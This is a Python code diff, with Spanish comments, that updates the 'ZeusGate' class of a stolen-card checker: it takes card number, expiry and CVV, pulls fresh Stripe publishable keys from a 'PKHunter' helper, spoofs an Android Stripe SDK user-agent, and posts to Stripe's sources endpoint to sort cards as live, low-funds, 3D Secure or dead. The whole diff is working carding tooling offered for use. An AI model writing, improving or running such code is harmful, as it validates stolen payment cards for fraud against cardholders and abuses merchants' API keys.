@@ -85,11 +85,10 @@ class ChaosGate:
 
 
 class ZeusGate:
-    """GATEWAY DE POTENCIA 'CHARGEABLE' (STRIPE SOURCES)"""
+    """GATEWAY DE POTENCIA REAL 'CHARGEABLE' (NO SIMULADOR)"""
     @staticmethod
     def check_zeus(cc, mm, yy, cvv):
         pk = PKHunter.get_fresh_pk()
-        # Usamos un User-Agent de Android para simular una App real
         headers = {'User-Agent': 'Stripe/v1 AndroidBindings/20.14.1'}
         
         payload = {
@@ -102,23 +101,32 @@ class ZeusGate:
         }
         
         try:
-            # Endpoint de Sources: Prepara el dinero para el cargo
+            # Consultamos la API real de Stripe
             r = requests.post('https://api.stripe.com/v1/sources', data=payload, headers=headers, timeout=15)
             res = r.json()
-            res_text = str(res).lower()
             
-            # ANÁLISIS DE ESTADO 'CHARGEABLE' (LIVE PURO)
-            if 'id' in res and res.get('status') == 'chargeable':
+            # --- FILTRO DE SANGRE (SOLO PASA LO REAL) ---
+            status = res.get('status')
+            res_text = str(res).lower()
+
+            # 1. LIVE ABSOLUTO: La tarjeta tiene fondos y está lista
+            if status == 'chargeable':
                 return {"status": "LIVE ✅", "msg": "Zeus Approved (Chargeable)", "raw": res}
             
+            # 2. LIVE POR FONDOS: La tarjeta es real pero no tiene dinero
             elif "insufficient_funds" in res_text:
                 return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
             
+            # 3. 3D SECURE: Tarjeta viva pero con seguridad extra
             elif "three_d_secure" in res_text or "required" in res_text:
-                return {"status": "LIVE 💎 (3DS)", "msg": "3D Secure Triggered", "raw": res}
-            
+                return {"status": "LIVE 💎 (3DS)", "msg": "3D Secure Required", "raw": res}
+
+            # 4. MUERTE TOTAL: Cualquier error de Stripe es DEAD
             else:
-                err = res.get('error', {}).get('message', 'Declined')
-                return {"status": "DEAD ❌", "msg": err, "raw": res}
+                # Extraemos el motivo real del declive directamente de Stripe
+                err_msg = res.get('error', {}).get('message', 'Transaction Declined')
+                return {"status": "DEAD ❌", "msg": err_msg, "raw": res}
+
         except Exception as e:
-            return {"status": "ERROR ⚠️", "msg": "Zeus Timeout", "raw": {}}
+            # Si hay error de conexión, no mentimos: es un fallo de sistema
+            return {"status": "ERROR ⚠️", "msg": "Zeus Timeout/Connection Error", "raw": {}}
